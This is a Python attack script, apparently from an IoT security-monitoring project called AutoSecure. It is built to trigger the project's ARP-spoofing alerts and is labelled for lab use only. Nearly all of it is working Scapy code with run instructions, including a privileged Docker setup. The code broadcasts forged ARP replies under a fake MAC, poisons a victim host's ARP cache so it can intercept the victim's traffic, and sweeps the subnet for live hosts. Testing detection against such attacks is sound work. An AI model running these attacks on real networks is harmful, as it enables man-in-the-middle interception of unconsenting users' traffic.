"""
Attack Script: ARP Spoofing / Cache Poisoning
=============================================
Target  : Any discovered device on the network (configure TARGET_IP below)
Protocol: ARP (Layer 2 — requires Scapy and admin/root privileges)

Attacks performed
-----------------
1. ARP SPOOF BROADCAST    — sends gratuitous ARP replies claiming to own
                            the target device's IP with an attacker MAC
                            → triggers ARP_SPOOF alert in monitoring engine

2. ARP CACHE POISON       — poisons the ARP cache of a victim host so that
                            traffic meant for TARGET_IP is redirected to us
                            (classic Man-in-the-Middle setup)

3. ARP RECONNAISSANCE     — sends ARP who-has requests to map the network
                            and identify live hosts

Requirements
------------
  pip install scapy        (already required by the monitoring engine)
  Run as Administrator (Windows) or with sudo (Linux/Mac)
  Npcap must be installed on Windows for Scapy raw packet injection

Run order
---------
  1. python Devices/mDNS/generic_iot_device.py   (or any device)
  2. python Engines/main.py                       (start monitoring)
  3. python Attacks/attack_arp_spoof.py           (run this script as admin)

Expected monitoring alerts
--------------------------
  [ARP_SPOOF]  — ARP reply with a different MAC than the known IP-to-MAC mapping
"""

import time
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
# Override with:  python attack_arp_spoof.py <TARGET_IP> [VICTIM_IP]
# Docker example: python attack_arp_spoof.py 172.17.0.2 172.17.0.1
#
# IMPORTANT — Docker on Windows:
#   ARP spoofing from the Windows host does NOT reach Docker containers
#   because Docker Desktop uses a Hyper-V / WSL2 virtual bridge.
#   You MUST run this script inside a privileged Docker container:
#
#     docker build -t autosecure-arp-attack Attacks/
#     docker run --rm --network bridge --cap-add=NET_RAW --cap-add=NET_ADMIN \
#       autosecure-arp-attack 172.17.0.2 172.17.0.1
#
#   A Dockerfile is provided at Attacks/Dockerfile.arp_spoof
#
TARGET_IP      = sys.argv[1] if len(sys.argv) > 1 else "172.17.0.2"
VICTIM_IP      = sys.argv[2] if len(sys.argv) > 2 else "172.17.0.1"
ATTACKER_MAC   = "de:ad:be:ef:00:01"
SPOOF_COUNT    = 10
SPOOF_INTERVAL = 0.5
RECON_SUBNET   = ".".join(TARGET_IP.split(".")[:3])   # auto-derived from TARGET_IP
# ─────────────────────────────────────────────────────────────────────────────


def print_banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


def check_scapy():
    """Import Scapy and warn if not available."""
    try:
        from scapy.all import ARP, Ether, sendp, srp, conf
        return True
    except ImportError:
        print("\n  ERROR: Scapy is not installed.")
        print("  Install it with:  pip install scapy")
        print("  On Windows also install Npcap from https://npcap.com/")
        return False


# ── ATTACK 1: ARP SPOOF BROADCAST ────────────────────────────────────────────
def attack_arp_spoof_broadcast():
    print_banner("ATTACK 1: ARP Spoof Broadcast — Impersonate Target IP")
    print(f"  Target IP    : {TARGET_IP}  (device to impersonate)")
    print(f"  Fake MAC     : {ATTACKER_MAC}")
    print(f"  Action       : Sending {SPOOF_COUNT} gratuitous ARP replies")
    print(f"  Alert        : ARP_SPOOF — monitoring engine sees MAC mismatch\n")

    try:
        from scapy.all import ARP, Ether, sendp, conf
        conf.verb = 0   # Suppress Scapy output
    except ImportError:
        print("  Scapy not available — skipping this attack")
        return

    # Gratuitous ARP reply:  "I am TARGET_IP and my MAC is ATTACKER_MAC"
    # Sent to the broadcast address so all hosts update their ARP cache
    packet = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC) /
        ARP(
            op=2,                  # op=2 means ARP reply
            hwsrc=ATTACKER_MAC,    # Attacker's fake MAC
            psrc=TARGET_IP,        # IP we are claiming to own
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst="0.0.0.0",
        )
    )

    print(f"  Sending spoofed ARP replies...")
    for i in range(SPOOF_COUNT):
        sendp(packet, verbose=False)
        print(f"    ARP reply #{i+1:3d}  {TARGET_IP} is-at {ATTACKER_MAC} (broadcast)", end="\r")
        time.sleep(SPOOF_INTERVAL)

    print(f"\n  {SPOOF_COUNT} spoofed ARP replies sent")
    print("  >> ARP_SPOOF alert should have fired in the monitoring engine")


# ── ATTACK 2: ARP CACHE POISON (MitM) ────────────────────────────────────────
def attack_arp_cache_poison():
    print_banner("ATTACK 2: ARP Cache Poisoning (Man-in-the-Middle Setup)")
    print(f"  Target IP    : {TARGET_IP}  (host whose traffic we want to intercept)")
    print(f"  Victim IP    : {VICTIM_IP}  (host we are poisoning, e.g. gateway)")
    print(f"  Fake MAC     : {ATTACKER_MAC}")
    print(f"  Action       : Sending {SPOOF_COUNT} directed ARP replies to victim")
    print(f"  Effect       : Victim thinks TARGET_IP lives at ATTACKER_MAC")
    print(f"                 Traffic from VICTIM → TARGET will flow to attacker\n")

    try:
        from scapy.all import ARP, Ether, sendp, conf
        conf.verb = 0
    except ImportError:
        print("  Scapy not available — skipping this attack")
        return

    # Tell VICTIM that TARGET_IP has ATTACKER_MAC
    # This poisons only VICTIM's ARP cache (not broadcast)
    packet = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC) /
        ARP(
            op=2,
            hwsrc=ATTACKER_MAC,
            psrc=TARGET_IP,
            pdst=VICTIM_IP,
        )
    )

    print(f"  Poisoning {VICTIM_IP}'s ARP cache...")
    for i in range(SPOOF_COUNT):
        sendp(packet, verbose=False)
        print(f"    ARP poison #{i+1:3d}  telling {VICTIM_IP}: {TARGET_IP} is-at {ATTACKER_MAC}", end="\r")
        time.sleep(SPOOF_INTERVAL)

    print(f"\n  {SPOOF_COUNT} poison packets sent to {VICTIM_IP}")
    print(f"  >> Victim {VICTIM_IP} now routes traffic for {TARGET_IP} to {ATTACKER_MAC}")
    print("  >> ARP_SPOOF alert should have fired if monitoring saw the ARP replies")


# ── ATTACK 3: ARP RECONNAISSANCE ─────────────────────────────────────────────
def attack_arp_recon():
    print_banner("ATTACK 3: ARP Reconnaissance — Network Host Discovery")
    print(f"  Subnet  : {RECON_SUBNET}.1 — {RECON_SUBNET}.254")
    print(f"  Action  : Sending ARP who-has to find all live hosts")
    print(f"  Effect  : Builds a map of IP → MAC for the entire subnet\n")

    try:
        from scapy.all import ARP, Ether, srp, conf
        conf.verb = 0
    except ImportError:
        print("  Scapy not available — skipping this attack")
        return

    # Scan first 30 hosts in the subnet to keep it short
    targets = [f"{RECON_SUBNET}.{i}" for i in range(1, 31)]
    live_hosts = []

    print("  Scanning (ARP who-has)...")
    for ip in targets:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(pkt, timeout=0.5, verbose=False)
        for _, received in ans:
            mac = received[ARP].hwsrc
            print(f"    {ip:18s} → {mac}  (ALIVE)")
            live_hosts.append((ip, mac))

    if not live_hosts:
        print("  No hosts responded (expected on loopback — run on a real LAN)")
    else:
        print(f"\n  ARP recon complete — {len(live_hosts)} live host(s) found:")
        for ip, mac in live_hosts:
            print(f"    {ip}  →  {mac}")

    print("\n  >> ARP recon maps the network — foundation for targeted ARP spoofing")


# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "#" * 60)
    print("#  AutoSecure Attack Simulation — ARP Spoofing             #")
    print("#  Protocol : ARP (Layer 2)  — requires admin/root         #")
    print("#  FOR EDUCATIONAL / LAB USE ONLY                         #")
    print("#" * 60)
    print(f"\n  Target IP    : {TARGET_IP}  ← device to impersonate")
    print(f"  Victim IP    : {VICTIM_IP}  ← host to poison")
    print(f"  Attacker MAC : {ATTACKER_MAC}")
    print("\n  IMPORTANT: This requires Scapy and admin/root privileges.")
    print("  On Windows: install Npcap from https://npcap.com/ and run as Administrator")
    print("  On Linux:   run with  sudo python Attacks/attack_arp_spoof.py")

    if not check_scapy():
        sys.exit(1)

    print("\n  Make sure a device and the monitoring engine are running first.")
    print("  The monitoring engine must have already discovered TARGET_IP")
    print("  so it has a known IP→MAC mapping to compare against.")
    input("\n  Press Enter to begin attacks...")

    attack_arp_spoof_broadcast()
    time.sleep(2)
    attack_arp_cache_poison()
    time.sleep(2)
    attack_arp_recon()

    print("\n" + "=" * 60)
    print("  All attacks complete.")
    print("  Check the monitoring engine output for triggered alerts.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
